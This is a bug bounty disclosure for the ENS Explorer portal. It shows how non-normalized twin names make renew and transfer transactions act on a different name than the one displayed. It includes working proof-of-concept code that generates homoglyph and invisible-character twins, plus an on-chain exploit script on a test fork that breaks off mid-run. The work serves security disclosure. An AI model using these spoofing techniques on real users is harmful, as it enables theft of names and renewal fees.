# 91224 w a critical explorer renew transfer encode the on chain write from a normalizing helper while the ownership gate and displayed transaction use the raw name a victim renews or transfers a&#x20;

**Submitted on Aug 30th 2026 at 18:36:22 UTC by @enowk for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91224
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves
  * Direct theft of user funds

## Description

## Brief/Intro

In `apps/portal` (the Explorer), the flows that **renew** and **transfer** an ENS name derive their on-chain write target from a name-normalizing helper (`getLabel` → `ens_normalize`), while the same operation's ownership gate, price, displayed dates, and the transaction description the user approves are all taken from the **raw** name string — and nothing ever checks that the two refer to the same on-chain node.

For any name whose label is not already ENSIP-15-normalized (the registrar accepts such labels), the application reasons about, gates, and displays one name while transacting against a different, attacker-chosen one.

In production this lets an attacker register a normalized-twin of a name — one that renders identically or innocuously (a plain capital, a fullwidth glyph, an invisible codepoint, or an accented real word) — and airdrop it to a victim (no consent needed) so it appears in the victim's own names table. When the victim renews it they pay to extend the **attacker's** name while their own expires, and when they transfer it they move (and, with the default options, first brick) a **different** name than every screen showed them.

## Vulnerability Details

All line references are against the audited monorepo at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, asset `apps/portal`.

### The defect

`apps/portal/src/utils/token/getLabel.ts:10` rewrites the name before it is used as a write target:

```ts
export function getLabel(name: string): string {
  const normalized = ens_normalize(name)      // line 11 — silently rewrites the target
  const labels = ens_split(normalized)
  const first = labels[0]
  if (!first || first.error) throw first?.error
  return String.fromCodePoint(...first.input)  // the NORMALIZED first label
}
```

Because `namehash`/`labelhash` are defined over the normalized label but the raw string is a distinct byte sequence, `getLabel(displayed)` can resolve to a label the user never typed or saw.

* `getLabel('Wallet.eth') === 'wallet'`
* `getLabel('café.eth')` (with a combining accent) `=== 'café'` (precomposed)
* `getLabel('wal️let.eth') === 'wallet'`

Nothing downstream compares the result to the label that was displayed, gated, or priced.

### The split — display/gate use the RAW name, the write uses the NORMALIZED label

**Renew (`features/renew/hooks/useRenewalTransactions.ts`):**

```ts
// buildRenewIntent — line 197: the WRITE target is normalized
name: `${getLabel(params.name)}.eth`,
// buildRenewTransaction — line 221/223: the id and the description the user approves are RAW
id: RENEWAL_TX_IDS.renew(params.name),
description: `Renew ${params.name}`,
```

The comment on line 191 (*"ensjs splits the label without normalizing, so pass a normalized 2LD name"*) shows the retarget was deliberate — its consequence (a different on-chain name) was not noticed.

**Transfer (`features/transfer/hooks/useTransferName.ts`):**

```ts
// line 113 — the token that will actually move
getEnsTokenId({ label: getLabel(name), registryAddress })
// line 132 — reused by the pre-transfer steps
const label = getLabel(name)
  .with('detach-resolver', () => detachNameResolver({ ...common, label, ... }))  // line 137
  .with('detach-registry', () => detachNameRegistry({ ...common, label, ... }))  // line 140
  .with('transfer-token',  () => transferToken({ ...common, tokenId, recipient, ... }))  // line 143
```

* `getEnsTokenId` → ensjs `getTokenId` → `BigInt(labelhash(label))` (`@ensdomains/ensjs/src/actions/public/v2/getTokenId.ts:43`) — the **normalized** name's token.
* `detachNameResolver` → `registry.setResolver(tokenId(label), 0x0)`; `detachNameRegistry` → `parent.setSubregistry(label, 0x0)`.
* Meanwhile the approved transaction is described with the **raw** name: `helpers/transferToken.ts:88` → `` description: `Transfer ${name}` `` (and `detachNameResolver.ts:91`, `detachNameRegistry.ts:92` likewise).

### Why both authorization gates pass — the permission check is the trigger, not a mitigation

The transfer route `routes/$name/ownership/transfer.tsx` applies exactly two gates and **no** `isValidEnsName` (grep across `routes/$name/ownership/` returns none):

| Gate                                                                                                                                               | Evaluated on | Node              | Result                                  |
| -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ----------------- | --------------------------------------- |
| Owner gate — `getEnsOwnerQueryOptions({ name })` → ensjs `getOwner` → `toHex(packetToBytes(name))`, **no normalization** (`.../v2/getOwner.ts:53`) | RAW          | the twin          | passes — victim owns the twin (airdrop) |
| Role gate — `useCanTransferName` → `hasRoles(getLabel(name), ROLE_CAN_TRANSFER_ADMIN, owner)` (`useCanTransferName.ts:59`)                         | NORMALIZED   | the real name     | passes — victim owns the real name      |
| The write — `getTokenId` / detaches / `safeTransferFrom`                                                                                           | NORMALIZED   | **the real name** | executes against the real name          |
| Heading, table row, tx description                                                                                                                 | RAW          | the twin          | shows the twin                          |

The two gates are satisfied **exactly when the victim owns both names** — precisely the exploitable case. If the victim did not own the real name, the role gate would fail and the form would show "Transfer not available." The permission check is the trigger condition, not a defense.

### Instance 1 (lead) — Renew: the victim pays to extend the attacker's name

The names table (`routes/addr/$addr/names.tsx`) has no normalization filter; `useV2NamesWithRolesForAddress.ts:86` maps the indexer's `domain.name` through verbatim, and the Extend action is gated only on the raw regex `isExtendable2LD` = `/^[^.]+\.eth$/` (`features/renew/utils/nameExtension.ts`).

So an airdropped twin is renewable straight from the table with **no** "invalid name" friction. `buildRenewIntent` then encodes `renew(getLabel(displayed), …)`.

With the attacker owning the real name and the victim holding the twin, the victim pays the renewal fee, the **attacker's** registration is extended, and the victim's displayed name is not renewed and expires.

### Instance 2 — Transfer: the wrong name moves, and is bricked first

Both detach options default to `true` (`features/transfer/components/SendNameForm.tsx:71-72`), and `buildTransferPlan.ts` pushes `detach-resolver` and `detach-registry` **before** `transfer-token` (lines 33, 37, 40).

So on the default path the flow runs `setResolver(realName, 0x0)` and `parent.setSubregistry(realName, 0x0)` — permanently breaking resolution of the real name and its subnames — and then `safeTransferFrom` moves the real name's ERC-1155 to the recipient the victim chose.

Every screen and the tx description named the twin.

### Instance 3 — Subname deletion (same root cause)

`routes/$name/subnames.tsx:210` (`runDelete`) and `:268` (`getDeleteIntent`) both pass `label: getLabel(subname.name)` into the delete write while the row renders `subname.name` raw.

Same divergence; delivery is harder (an attacker cannot generally mint a subname under the victim's name), so this is listed as a third instance of one root cause, not a standalone claim.

### Why this is systemic, and the payload space is wide and benign-looking

The bug is not one helper's edge case: every write derived from `getLabel` (renew, transfer's token + two detaches, subname delete) is retargeted, while display and the route gates keep the raw string.

Sweeping Unicode against the real `ens_normalize` yields **989** codepoints that each normalize to a single `[a-z0-9]` character plus **29** that normalize to nothing (invisible: ZWSP, BOM, soft-hyphen, variation selectors U+FE00–FE0F, …).

For a 7-character label there are **245** single-substitution twins and \~**7.8×10¹⁰** combination twins — all attacker-computed offline, none a guess.

Driving 3,507 generated display strings through the app's own `getLabel` / `isValidEnsName` / `is2LD` / `isExtendable2LD`:

* **`isValidEnsName` is false for all 3,507**
* **the transfer gate admits all 3,507**
* **the renew gate admits all 3,507**
* **`getLabel` retargets all 3,507** to the intended victim label

Every non-normalized 2LD is admitted into both flows. Payloads range from an obvious capital to genuinely undetectable ones (`wal‍let.eth` with an embedded U+FE0F renders as `wallet.eth`; `café.eth` is an ordinary word carrying a combining accent).

## Impact Details

**Selected in-scope impacts (verbatim from the program list):**

1. **"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient … showing the wrong recipient or amount on a transaction the user then approves"** — the primary match. In both flows the name on the approved transaction is not the name that is acted upon: the renew displays "Renew X.eth" while `renew()` targets a different label; the transfer displays "Transfer X.eth" while `safeTransferFrom` moves a different token. This holds **unconditionally** — no attacker-controlled recipient and no social step required.
2. **"Direct theft of user funds"** — the **renew** instance. The attacker owns the real name; the victim holds the airdropped twin and renews it. The victim's ERC-20 renewal fee is spent extending the **attacker's** registration (calldata `renew("<attacker label>", 31536000, <paymentToken>, …)` to the ETHRegistrar), while the victim's displayed name receives nothing and expires. The attacker is the sole beneficiary of the victim's spend, and controls the beneficiary with no social step.

### Loss breakdown per exploited victim

* **Renew:** one full renewal fee (1 year in the ERC-20 the portal charges) transferred out of the victim's wallet for zero benefit to the victim; the attacker's name extended by the same year; the victim's real name left to expire (subsequent loss of the name at grace-period end).
* **Transfer:** the victim's real name (an ERC-1155 that may hold significant value) is moved to the recipient the victim believed they were sending the worthless twin to; on the default path the real name and all its subnames are additionally bricked (resolver + subregistry zeroed) before the move — an irreversible loss of resolution even if the token itself is recovered.
* **Attacker cost:** one minimum-length registration for the twin plus one airdrop transaction. No privileged position, no victim account or device access.

### Interaction model

The victim must initiate the renew/transfer on the twin — this is not a "without any interaction" impact and is not claimed as one.

It is exactly the model the matched Critical lines assume ("so that a user … submits a transaction", "a transaction the user then approves"): the user acts correctly on information the application got wrong.

The renew path reaches the exploit from the names table with no validity warning; the transfer path passes through one `/$name` page that shows "Invalid name" before the always-rendered Ownership sidebar link (`$name/index.tsx:458`), which is why the renew leg is the lead.

### Not claimed

* No zero-interaction variant.
* No account/wallet takeover; the victim signs.
* The `apps/manager` renew flow does **not** share this defect (it does not route through `getLabel`).
* This report is scoped to `apps/portal` only.

## References

* Root cause: `apps/portal/src/utils/token/getLabel.ts:10-20`
* Renew: `apps/portal/src/features/renew/hooks/useRenewalTransactions.ts:197` (write) vs `:221,:223` (id + description); gate `apps/portal/src/features/renew/utils/nameExtension.ts` (`isExtendable2LD`)
* Transfer: `apps/portal/src/features/transfer/hooks/useTransferName.ts:113,132,137,140,143`; `helpers/transferToken.ts:88`; `utils/buildTransferPlan.ts:33,37,40`; `components/SendNameForm.tsx:71-72`
* Gates: `apps/portal/src/routes/$name/ownership/transfer.tsx`; `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:59`; `apps/portal/src/features/profile/hooks/useEnsOwner.ts`; ensjs `getOwner.ts:53` / `getTokenId.ts:43`
* Display path: `apps/portal/src/routes/addr/$addr/names.tsx`; `apps/portal/src/features/dashboard/hooks/useV2NamesWithRolesForAddress.ts:86`; `routes/$name/index.tsx:458`
* Subname instance: `apps/portal/src/routes/$name/subnames.tsx:210,268`
* ENS normalization spec (ENSIP-15) — normalize before namehash/labelhash: <https://docs.ens.domains/ensip/15>

## Link to Proof of Concept

<https://gist.github.com/taunokont9-maker/d5198f372c7e905445a913d31f2be9a5>

## Proof of Concept

Three PoCs, each driving the **real** product modules from `apps/portal` (no re-implementations) at commit `1c9b47f`.

PoC A and B are pure (no chain); PoC C runs end-to-end on an anvil fork of Sepolia.

Together they show:

1. The write is silently retargeted.
2. The retarget produces byte-identical calldata against a different name.
3. On-chain, the displayed name stays while a different real name moves.

The full source of each PoC is inlined below so the report is self-contained.

### Rig

* Repo at `1c9b47f`; from `apps/portal`, `pnpm install`.
* Test files must live under `apps/portal/src/` — vitest's `include` is rooted there, so a file placed elsewhere is silently "No test files found." Copy each PoC file into `apps/portal/src/` before running.
* For PoC C: `anvil --fork-url <sepolia-archive-rpc> --fork-block-number 11551747 --port 8545 --silent`. Pin the block (an unpinned head drifts to where the v2 register path reverts). Before registering, `setCode(account, '0x')` on every anvil test account — the well-known anvil addresses carry contracts on real Sepolia that break ERC-1155 `_safeMint`. (Reproduced on `sepolia.gateway.tenderly.co`.)

### PoC A — the write target is silently retargeted, at scale (pure, real modules)

Builds the attacker's alphabet by sweeping Unicode against the real `ens_normalize`, generates 3,507 display strings for 8 victim labels (single-substitution, invisible-insert, full-substitution, mixed), and runs each through the app's own `getLabel`, `isValidEnsName`, `is2LD`/`isTLD`, `isExtendable2LD`, plus viem `namehash`/`labelhash`.

Save as `apps/portal/src/divergence-corpus.test.ts`:

{% code title="apps/portal/src/divergence-corpus.test.ts" overflow="wrap" %}

```ts
import { describe, expect, it } from 'vitest'
import { labelhash, namehash } from 'viem/ens'
import { ens_normalize } from '@adraffy/ens-normalize'

// REAL product modules under test — no re-implementations.
import { getLabel } from '@/utils/token/getLabel'
import { isValidEnsName } from '@/utils/token/isNormalized'
import { is2LD, isTLD } from '@/utils/ens/tldHelpers'
import { isExtendable2LD } from '@/features/renew/utils/nameExtension'

/**
 * Attacker-perspective corpus sweep: displayed name vs on-chain write target.
 *
 * Question asked of the code: for a victim label the attacker picks, how large is
 * the set of DISPLAY strings that (a) the Explorer admits into the transfer and
 * renew flows, and (b) `getLabel` silently rewrites to that exact victim label?
 */

// ---- Build the attacker's alphabet by sweeping Unicode, not by hand-picking ----
const COLLISION: Map<string, number[]> = new Map()
const INVISIBLE: number[] = []
for (const [lo, hi] of [[0x20, 0xffff], [0x10000, 0x1fbff]]) {
  for (let cp = lo; cp <= hi; cp++) {
    const ch = String.fromCodePoint(cp)
    let out: string
    try { out = ens_normalize(ch + 'zz') } catch { continue }
    if (!out.endsWith('zz')) continue
    const head = out.slice(0, out.length - 2)
    if (head === ch) continue
    if (head === '') { INVISIBLE.push(cp); continue }
    if (head.length === 1 && /[a-z0-9]/.test(head)) {
      if (!COLLISION.has(head)) COLLISION.set(head, [])
      COLLISION.get(head)!.push(cp)
    }
  }
}

const VICTIM_LABELS = ['vitalik', 'nick', 'ens', 'alice', 'brantly', 'coinbase', '123', 'wallet']

type Row = { displayed: string; kind: string; victim: string }
const corpus: Row[] = []

// 1. every single-character substitution, every position, every collision codepoint
for (const victim of VICTIM_LABELS) {
  for (let i = 0; i < victim.length; i++) {
    for (const cp of COLLISION.get(victim[i]!) ?? []) {
      const displayed = victim.slice(0, i) + String.fromCodePoint(cp) + victim.slice(i + 1)
      corpus.push({ displayed: `${displayed}.eth`, kind: 'substitute-1', victim })
    }
  }
}
// 2. every invisible codepoint at every insertion position
for (const victim of VICTIM_LABELS) {
  for (let i = 0; i <= victim.length; i++) {
    for (const cp of INVISIBLE) {
      const displayed = victim.slice(0, i) + String.fromCodePoint(cp) + victim.slice(i)
      corpus.push({ displayed: `${displayed}.eth`, kind: 'invisible-insert', victim })
    }
  }
}
// 3. full-label substitution (every char swapped) — deterministic pick of variant k
for (const victim of VICTIM_LABELS) {
  for (let k = 0; k < 8; k++) {
    const chars = [...victim].map((c) => {
      const v = COLLISION.get(c) ?? []
      return v.length ? String.fromCodePoint(v[k % v.length]!) : c
    })
    corpus.push({ displayed: `${chars.join('')}.eth`, kind: 'substitute-all', victim })
  }
}
// 4. mixed: one substitution + one invisible
for (const victim of VICTIM_LABELS) {
  for (const cp of COLLISION.get(victim[0]!)?.slice(0, 12) ?? []) {
    for (const inv of INVISIBLE.slice(0, 6)) {
      const displayed =
        String.fromCodePoint(cp) + victim.slice(1) + String.fromCodePoint(inv)
      corpus.push({ displayed: `${displayed}.eth`, kind: 'mixed', victim })
    }
  }
}

describe('normalization divergence — attacker corpus', () => {
  it('reports the size of the attacker alphabet', () => {
    const perChar = [...COLLISION].map(([k, v]) => `${k}:${v.length}`).join(' ')
    console.log(`\nCOLLISION CODEPOINTS: ${[...COLLISION.values()].reduce((a, b) => a + b.length, 0)} across ${COLLISION.size} targets`)
    console.log(`INVISIBLE CODEPOINTS: ${INVISIBLE.length}`)
    console.log(perChar)
    // twin-space size for a 7-char label using single-char substitution only
    const v = 'vitalik'
    const single = [...v].reduce((a, c) => a + (COLLISION.get(c)?.length ?? 0), 0)
    const full = [...v].reduce((a, c) => a * ((COLLISION.get(c)?.length ?? 0) + 1), 1) - 1
    console.log(`TWIN SPACE for "vitalik": single-substitution=${single}, any-combination=${full.toLocaleString()}`)
    expect(COLLISION.size).toBe(36)
  })

  it('every corpus entry: displayed name is a DISTINCT on-chain node', () => {
    let bad: string[] = []
    for (const r of corpus) {
      if (namehash(r.displayed) === namehash(`${r.victim}.eth`)) bad.push(r.displayed)
      if (labelhash(r.displayed.split('.')[0]!) === labelhash(r.victim)) bad.push(r.displayed)
    }
    console.log(`\nCORPUS SIZE: ${corpus.length}`)
    expect(bad).toEqual([])
  })

  it('every corpus entry: getLabel() retargets the write to the victim label', () => {
    const bad: { displayed: string; got: string; want: string }[] = []
    let threw = 0
    for (const r of corpus) {
      let got: string
      try { got = getLabel(r.displayed) } catch { threw++; continue }
      if (got !== r.victim) bad.push({ displayed: r.displayed, got, want: r.victim })
    }
    console.log(`RETARGETED: ${corpus.length - threw - bad.length} / ${corpus.length}  (threw=${threw}, mismatch=${bad.length})`)
    expect(bad.slice(0, 5)).toEqual([])
  })

  it('gates: the app already knows these are invalid, yet admits them to BOTH flows', () => {
    let admittedTransfer = 0, admittedRenew = 0, knownInvalid = 0, weaponized = 0
    const byKind: Record<string, number> = {}
    for (const r of corpus) {
      const invalid = !isValidEnsName(r.displayed)
      const transferOk = is2LD(r.displayed) && !isTLD(r.displayed)
      const renewOk = isExtendable2LD({
        name: r.displayed,
        isV2: true,
        expiryDate: new Date(Date.now() + 86_400_000 * 30),
      } as Parameters<typeof isExtendable2LD>[0])
      if (invalid) knownInvalid++
      if (transferOk) admittedTransfer++
      if (renewOk) admittedRenew++
      let retargets = false
      try { retargets = getLabel(r.displayed) === r.victim } catch { retargets = false }
      if (invalid && transferOk && renewOk && retargets) {
        weaponized++
        byKind[r.kind] = (byKind[r.kind] ?? 0) + 1
      }
    }
    console.log(`\nisValidEnsName === false : ${knownInvalid} / ${corpus.length}`)
    console.log(`admitted by TRANSFER gate: ${admittedTransfer} / ${corpus.length}`)
    console.log(`admitted by RENEW gate   : ${admittedRenew} / ${corpus.length}`)
    console.log(`FULLY WEAPONIZED         : ${weaponized} / ${corpus.length}`)
    console.log(`by kind: ${JSON.stringify(byKind)}`)
    expect(weaponized).toBeGreaterThan(1000)
  })
})
```

{% endcode %}

Run:

```sh
./node_modules/.bin/vitest run src/divergence-corpus.test.ts
```

Observed (4/4 pass):

```
COLLISION CODEPOINTS: 989 across 36 targets
INVISIBLE CODEPOINTS: 29
TWIN SPACE for "vitalik": single-substitution=245, any-combination=77,821,087,679
CORPUS SIZE: 3507
RETARGETED: 3507 / 3507  (threw=0, mismatch=0)     <- getLabel(displayed) == victim label
isValidEnsName === false : 3507 / 3507             <- the app already knows they're not normalized
admitted by TRANSFER gate: 3507 / 3507
admitted by RENEW gate   : 3507 / 3507
FULLY WEAPONIZED         : 3507 / 3507
by kind: {"substitute-1":1406,"invisible-insert":1479,"substitute-all":64,"mixed":558}
```

Meaning: for every one of 3,507 display strings, viem confirms it is a distinct on-chain node (namehash and labelhash differ from the victim's), the app flags it invalid via `isValidEnsName`, yet both the transfer and renew gates admit it and `getLabel` rewrites it to the exact victim label the attacker chose.

### PoC B — renew produces byte-identical calldata renewing the attacker's label (pure, real modules)

Mirrors `buildRenewIntent` exactly (`renewNameWriteParameters(client, { name: getLabel(displayed)+'.eth', contract: 'ensEthRegistrar', … })`), encodes the calldata for `wallet.eth` and for four twins the victim would see, and decodes the result.

Save as `apps/portal/src/renew-calldata.test.ts`:

{% code title="apps/portal/src/renew-calldata.test.ts" overflow="wrap" %}

```ts
import { describe, expect, it } from 'vitest'
import { renewNameWriteParameters } from '@ensdomains/ensjs/wallet'
import { encodeFunctionData, createPublicClient, http, decodeFunctionData } from 'viem'
import { getLabel } from '@/utils/token/getLabel'
import { sepoliaWithEns } from '@/lib/wagmi'
import { REFERER_ADDRESS } from '@ens-apps/transaction-manager/contracts/ens-sepolia'

// Mirrors the product's buildRenewIntent (useRenewalTransactions.ts:190) exactly:
// name = `${getLabel(params.name)}.eth`, contract ensEthRegistrar.
const client = createPublicClient({ chain: sepoliaWithEns, transport: http() }) as any
const REFERER = REFERER_ADDRESS

function renewData(displayedName: string) {
  const wp = renewNameWriteParameters(client, {
    name: `${getLabel(displayedName)}.eth`,
    duration: 31536000n,
    paymentToken: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238' as const,
    referrer: REFERER,
    contract: 'ensEthRegistrar',
  } as any)
  return {
    to: wp.address,
    data: encodeFunctionData({ abi: wp.abi, functionName: wp.functionName, args: wp.args } as any),
    args: wp.args,
  }
}

describe('renew calldata — funds leg', () => {
  it('victim-owned name vs three attacker twins produce IDENTICAL calldata renewing the attacker label', () => {
    const attackerLabel = 'wallet'
    const real = renewData('wallet.eth')
    const twins = ['Wallet.eth', 'ｗallet.eth', 'wal️let.eth', 'wal​let.eth']
    const rows = twins.map((t) => ({ displayed: t, ...renewData(t) }))
    console.log(`\nAttacker label the calldata renews: "${attackerLabel}"`)
    console.log(`REAL "wallet.eth" data: ${real.data.slice(0, 42)}…  to=${real.to}`)
    for (const r of rows) {
      const same = r.data === real.data
      console.log(`  displayed="${r.displayed}"  getLabel="${getLabel(r.displayed)}"  calldata==real: ${same}`)
      expect(getLabel(r.displayed)).toBe(attackerLabel)   // retargets to attacker
      expect(r.data).toBe(real.data)                       // byte-identical
      expect(r.to).toBe(real.to)
    }
    // decode to show the label string that will actually be renewed on-chain
    const decoded = decodeFunctionData({ abi: (renewNameWriteParameters(client, {
      name: 'wallet.eth', duration: 31536000n,
      paymentToken: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238' as const,
      referrer: REFERER, contract: 'ensEthRegistrar',
    } as any) as any).abi, data: real.data } as any)
    console.log(`decoded function: ${decoded.functionName}  args[0] (label renewed): ${JSON.stringify(decoded.args?.[0])}`)
    console.log('=> UI says "Renew Wallet.eth"; calldata renews the attacker-controlled label. Victim pays; attacker name extended.')
  })
})
```

{% endcode %}

Run:

```sh
./node_modules/.bin/vitest run src/renew-calldata.test.ts
```

Observed (1/1 pass):

```
Attacker label the calldata renews: "wallet"
REAL "wallet.eth" data: 0x89d779c3…  to=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
  displayed="Wallet.eth"   getLabel="wallet"  calldata==real: true
  displayed="ｗallet.eth"   getLabel="wallet"  calldata==real: true   (fullwidth)
  displayed="wal️let.eth"   getLabel="wallet"  calldata==real: true   (U+FE0F, invisible — renders as "wallet.eth")
  displayed="wal​let.eth"   getLabel="wallet"  calldata==real: true   (U+200B ZWSP, invisible)
decoded: renew("wallet", 31536000, 0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238, 0x00..00)
      -> 0xa88553F454b77203B0D036A05c894d555EAAa2Cc  (ETHRegistrar)
```

Meaning: the UI would show "Renew Wallet.eth" (raw, from `description: Renew ${params.name}`), while the calldata the victim signs renews the label `wallet` — the attacker's name — for one year, paid in the portal's renew ERC-20. Four visually-distinct display strings yield the same bytes.

### PoC C — end-to-end on-chain: displayed name stays, a different real name moves

For a chosen twin class it registers the normalized REAL label to the victim and the raw TWIN label to the attacker, has the attacker `safeTransferFrom` the twin to the victim (the consent-free airdrop), then has the victim "transfer the displayed twin" — i.e. the app derives `tokenId(getLabel(displayed))` and calls `safeTransferFrom` on it. Finally it reads ownership of both tokens.

Save as `<repo>/e2e/scripts/onchain-poc.ts`:

{% code title="e2e/scripts/onchain-poc.ts" overflow="wrap" %}

```ts
/**
 * Parameterized on-chain confirmation for an arbitrary non-normalized twin payload.
 * Registers REAL (normalized) to victim + TWIN (raw) to attacker, airdrops the
 * twin, then transfers using the app-derived label (getLabel). Verifies the REAL
 * name moved while the twin the UI named stayed put.
 *
 * REAL / TWIN come from env; a numeric suffix keeps labels unique across reruns.
 * Run: ANVIL_RPC_URL=http://127.0.0.1:8545 REAL=cafe TWIN=$'café' \
 *   pnpm --filter @ens-apps/e2e exec tsx scripts/onchain-poc.ts
 */
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { type Address, type Hash, createWalletClient, encodeFunctionData, http, keccak256, parseAbi, toHex, zeroAddress, zeroHash } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { normalize } from 'viem/ens'
import { publicClient, testClient } from '../helpers/anvil-client.js'

const c = ensL1Contracts[supportedL1Chains.sepolia]
const ETH_REGISTRAR = c.ensEthRegistrar.address, ETH_REGISTRY = c.ensRegistry.address, MOCK_USDC = c.usdc.address
const RESOLVER = '0x640294a2b2d87e7f522db3e3e3e876764bce170d' as const
const REG = parseAbi(['function makeCommitment(string label,address owner,bytes32 secret,address subregistry,address resolver,uint64 duration,bytes32 referrer) pure returns (bytes32)','function commit(bytes32 commitment)','function register(string label,address owner,bytes32 secret,address subregistry,address resolver,uint64 duration,address paymentToken,bytes32 referrer) returns (uint256)','function getRegisterPrice(string label,uint64 duration,address paymentToken) view returns (uint256,uint256)','function MIN_COMMITMENT_AGE() view returns (uint64)','function isAvailable(string label) view returns (bool)'])
const ERC20 = parseAbi(['function mint(address to,uint256 amount)','function approve(address spender,uint256 amount) returns (bool)'])
const REGISTRY = parseAbi(['function getTokenId(uint256 labelHash) view returns (uint256)','function balanceOf(address account,uint256 id) view returns (uint256)','function safeTransferFrom(address from,address to,uint256 id,uint256 amount,bytes data)'])
const KEYS = { funder:'0xac0974bec39a17e36ba4a17e36ba4a6b4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80', victim:'0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d', attacker:'0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a', sink:'0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6' } as const
const acct = (k:keyof typeof KEYS)=>privateKeyToAccount(KEYS[k] as Hash)
const wallet=(k:keyof typeof KEYS)=>createWalletClient({account:acct(k),chain:publicClient.chain,transport:http(process.env.ANVIL_RPC_URL??'http://127.0.0.1:8545')})
const wait=async(h:Hash)=>publicClient.waitForTransactionReceipt({hash:h})
const getLabel=(name:string)=>normalize(name).split('.')[0]
const DURATION=BigInt(365*24*60*60)
const RUN=process.env.RUN_ID??String(Date.now()).slice(-6)

async function register(label:string,ownerKey:keyof typeof KEYS){
  const owner=acct(ownerKey).address, w=wallet(ownerKey)
  await testClient.setCode({address:owner,bytecode:'0x'})
  const secret=keccak256(toHex(`poc-${RUN}-${label}`))
  await wait(await wallet('funder').writeContract({address:MOCK_USDC,abi:ERC20,functionName:'mint',args:[owner,10_000_000_000n]}))
  const commitment=await publicClient.readContract({address:ETH_REGISTRAR,abi:REG,functionName:'makeCommitment',args:[label,owner,secret,zeroAddress,RESOLVER,DURATION,zeroHash]})
  await wait(await w.sendTransaction({to:ETH_REGISTRAR,data:encodeFunctionData({abi:REG,functionName:'commit',args:[commitment]})}))
  const minAge=await publicClient.readContract({address:ETH_REGISTRAR,abi:REG,functionName:'MIN_COMMITMENT_AGE'})
  await testClient.increaseTime({seconds:Number(minAge)+1}); await testClient.mine({blocks:1})
  const [base,premium]=await publicClient.readContract({address:ETH_REGISTRAR,abi:REG,functionName:'getRegisterPrice',args:[label,DURATION,MOCK_USDC]})
  await wait(await w.writeContract({address:MOCK_USDC,abi:ERC20,functionName:'approve',args:[ETH_REGISTRAR,(base+premium)*2n]}))
  await wait(await w.sendTransaction({to:ETH_REGISTRAR,data:encodeFunctionData({abi:REG,functionName:'register',args:[label,owner,secret,zeroAddress,RESOLVER,DURATION,MOCK_USDC,zeroHash]})}))
}
const tokenIdOf=(label:string)=>publicClient.readContract({address:ETH_REGISTRY,abi:REGISTRY,functionName:'getTokenId',args:[BigInt(keccak256(toHex(label)))]})
const owns=async(w:Address,id:bigint)=>(await publicClient.readContract({address:ETH_REGISTRY,abi:REGISTRY,functionName:'balanceOf',args:[w,id]}))===1n

async function main(){
  const suffix=RUN
  // Presets avoid shell unicode-escaping pitfalls. Each entry is [realBase, twinRawBase, note].
  const PRESETS: Record<string,[string,string,string]> = {
    // benign real word: precomposed é vs e + combining acute U+0301
    cafe: ['caf\u00e9', 'cafe\u0301', 'combining accent (looks like an ordinary name)'],
    // fullwidth digits -> ascii digits (obvious-junk lure disposed of)
    digits: ['123', '\uff11\uff12\uff13', 'fullwidth digits -> 123'],
    // invisible: trailing zero-width space
    zwsp: ['zzp', 'zzp\u200b', 'trailing ZWSP (invisible)'],
    // invisible / fullwidth twin payloads:
    vs16:   ['wallet', 'wal\ufe0flet', 'embedded variation selector U+FE0F (invisible)'],
    soft:   ['payme', 'pay\u00adme', 'soft hyphen U+00AD (invisible)'],
    fw:     ['nick', '\uff4e\uff49\uff43\uff4b', 'fullwidth letters -> nick'],
  }
  const preset = PRESETS[process.env.PRESET ?? 'cafe']
  const REAL=(process.env.REAL ?? preset[0])+suffix       // normalized label the victim owns
  const TWINBASE=process.env.TWIN ?? preset[1]
  const TWIN=TWINBASE+suffix                              // raw label (may contain combining marks)
  if(!process.env.NOTE) process.env.NOTE = preset[2]
  const displayed=`${TWIN}.eth`
  const victim=acct('victim').address, attacker=acct('attacker').address, sink=acct('sink').address
  for(const a of [victim,attacker,sink]) await testClient.setCode({address:a,bytecode:'0x'})

  const appLabel=getLabel(displayed)
  console.log(`payload            : ${JSON.stringify(process.env.NOTE??'')}`)
  console.log(`REAL (victim owns) : ${REAL}`)
  console.log(`TWIN raw label     : ${JSON.stringify(TWIN)}  (codepoints: ${[...TWIN].map(ch=>'U+'+ch.codePointAt(0)!.toString(16)).join(' ')})`)
  console.log(`displayed          : ${displayed}`)
  console.log(`getLabel(displayed): ${appLabel}   ${appLabel===REAL?'== REAL  <-- retargets to victim name':'!= REAL'}`)
  if(appLabel!==REAL){ console.log('NOT A DIVERGING PAIR — abort'); process.exit(1) }

  for(const l of [REAL,TWIN]){
    const avail=await publicClient.readContract({address:ETH_REGISTRAR,abi:REG,functionName:'isAvailable',args:[l]})
    console.log(`isAvailable(${JSON.stringify(l)}) = ${avail}`)
    if(!avail) throw new Error(`not available: ${l}`)
  }
  await register(REAL,'victim'); await register(TWIN,'attacker')
  const realId=await tokenIdOf(REAL), twinId=await tokenIdOf(TWIN)
  if(realId===twinId) throw new Error('same token id')

  await wait(await wallet('attacker').writeContract({address:ETH_REGISTRY,abi:REGISTRY,functionName:'safeTransferFrom',args:[attacker,victim,twinId,1n,'0x']}))
  console.log(`airdrop twin -> victim: victimOwnsReal=${await owns(victim,realId)} victimOwnsTwin=${await owns(victim,twinId)}`)

